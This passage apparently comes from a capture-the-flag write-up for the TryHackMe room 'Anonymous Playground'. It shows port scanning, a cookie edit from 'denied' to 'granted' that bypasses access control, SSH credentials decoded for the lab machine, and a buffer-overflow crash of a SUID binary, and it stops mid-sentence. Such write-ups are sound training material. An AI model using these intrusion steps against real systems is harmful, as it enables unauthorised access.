## Anonymous Playground — TryHackMe Writeup

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/anonymous.png)

**Room Description**: Want to become part of Anonymous? They have a challenge for you. Can you get the flags and become an operative?

**Room Link**: [Anonymous Playground](https://tryhackme.com/room/anonymousplayground)

> So, you've decided to sign up with Anonymous?  Well, it won't be that easy.  They've constructed a vulnerable CTF machine for
you to hack your way into and prove you have what it takes to become a member of Anonymous.  Can you do it?  Do you have
what it takes?



---

#### Objectives: 
  - User 1 Flag
  - User 2 Flag
  - User 3 Flag

---

> Add the target to hosts:

```zsh
sudo echo -e '10.128.186.164 anon.thm' | sudo tee -a /etc/hosts
```

---

## Enum & Recon

```zsh
nmap -p- -T4 -n -Pn anon.thm
```

```zsh
nmap -p80 -sV anon.thm --script http*
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-09-30%2018-40-18.png)

> Directory Bruteforcing gave me the secret directory (which is already exposed inside /robots.txt): `/zYdHuAKjP`. If we visit it, we are denied access. But how does the server know who we are, and determine if we have the authorization to access this resource or not? After intercepting the request with burpsuite, I noticed we were assigned a cookie, which had the value `access=denied`. So a simple action like changing the `denied` value to `granted` will grant us the access to see what's in this directory.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-09-30%2018-50-28.png)

> Before

```
GET /zYdHuAKjP/ HTTP/1.1
Host: anon.thm
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: access=denied
Connection: keep-alive

```

> After

```
GET /zYdHuAKjP/ HTTP/1.1
Host: anon.thm
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: access=granted
Connection: keep-alive

```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/Anonymous%20Playground/Images/Screenshot%20From%202026-09-30%2019-38-47.png)


> It looks like we have to decode this. From the structure of it, it's really easy to tell that `::` is the separator for something like `username:password`. Secondly, there was a pattern - one lowercase and one uppercase character, and finally another clue is that there is a partial repetition in password section which has the same string from username in its first part. Which we can conclude it's something like `user:user123@!` for SSH. Now, with the help of the hint, we see `zA is 'a'`. Firstly, I converted `z` to its alphabetical position - `26`, and `A` to `27` as it was uppercase, and tried to solve it like `27-26=1` which made sense, as 'a' would be 1. But as it did not work, I used `A` as 1 as well, and solved it like `26+1=1`, as the next letter after `z` would be `a` if we think of it as a loop. Finally, the credentials we get is:

```
MAGNA::MAGNAISANELEPHANT
```

---

## Initial Foothold

> Let's ssh into user `magna`

```zsh
ssh magna@anon.thm
```

```zsh
magna@ip-10-128-189-54:~$ ls -la
total 64
drwxr-xr-x 7 magna  magna  4096 Jul 10  2020 .
drwxr-xr-x 6 root   root   4096 Sep 30 14:31 ..
lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -> /dev/null
-rw-r--r-- 1 magna  magna   220 Jul  4  2020 .bash_logout
-rw-r--r-- 1 magna  magna  3771 Jul  4  2020 .bashrc
drwx------ 2 magna  magna  4096 Jul  4  2020 .cache
drwxr-xr-x 3 magna  magna  4096 Jul  7  2020 .config
-r-------- 1 magna  magna    33 Jul  4  2020 flag.txt
drwx------ 3 magna  magna  4096 Jul  4  2020 .gnupg
-rwsr-xr-x 1 root   root   8528 Jul 10  2020 hacktheworld
drwxrwxr-x 3 magna  magna  4096 Jul  4  2020 .local
-rw-r--r-- 1 spooky spooky  324 Jul  6  2020 note_from_spooky.txt
-rw-r--r-- 1 magna  magna   807 Jul  4  2020 .profile
drwx------ 2 magna  magna  4096 Jul  4  2020 .ssh
-rw------- 1 magna  magna   817 Jul  7  2020 .viminfo
magna@ip-10-128-189-54:~$ cat note_from_spooky.txt 
Hey Magna,

Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky
```

> So as soon as I noticed it asked for input after executing the binary file Spooky created, I tested for Buffer Overflow, as we can confirm from the segmentation fault error.

```zsh
magna@ip-10-128-189-54:~$ ./hacktheworld 
Who do you want to hack? world
magna@ip-10-128-189-54:~$ ./hacktheworld
Who do you want to hack? 
magna@ip-10-128-189-54:~$ ./hacktheworld
Who do you want to hack? aaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

> The C code does not properly check the bounds. We need to reverse engineer it, 
